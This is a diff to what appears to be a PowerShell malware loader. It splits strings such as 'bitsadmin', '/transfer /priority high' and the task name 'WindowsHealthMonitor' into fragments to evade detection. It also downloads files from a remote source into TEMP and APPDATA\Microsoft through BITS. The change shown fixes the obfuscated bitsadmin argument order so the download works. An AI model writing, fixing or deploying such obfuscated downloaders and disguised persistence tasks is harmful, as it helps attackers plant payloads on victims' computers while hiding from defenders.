@@ -37,7 +37,8 @@ $n55='Win';$n56='dows';$n57='Heal';$n58='thMo';$n59='nito';$n60='r';$taskName=$n
 
 # BITSAdmin strings
 $n61='bit';$n62='sadm';$n63='in';$bits=$n61+$n62+$n63
-$n64='/tra';$n65='nsfer';$n66=' /pr';$n67='iori';$n68='ty h';$n69='igh';$bitsArgs="$n64$n65 $n66$n67$n68$n69"
+$n64='/tra';$n65='nsfer';$bitsXfer=$n64+$n65
+$n66=' /pr';$n67='iori';$n68='ty h';$n69='igh';$bitsPrio=$n66+$n67+$n68+$n69
 
 $t=$env:TEMP
 $ad="$env:APPDATA\Microsoft"
@@ -76,7 +77,7 @@ function _bitsDL($n,$dest,$label){
         $url="$src/$n"
         try{
             log "BITS: $label from $src"
-            $p=Start-Process $bits -ArgumentList "$bitsArgs `"$label`" `"$url`" `"$dest`"" -Wait -NoNewWindow -PassThru
+            $p=Start-Process $bits -ArgumentList "$bitsXfer `"$label`" $bitsPrio `"$url`" `"$dest`"" -Wait -NoNewWindow -PassThru
             if($p.ExitCode -eq 0 -and (Test-Path $dest)){
                 log "BITS: $label -> $dest ($((Get-Item $dest).Length) bytes)"
                 return $true
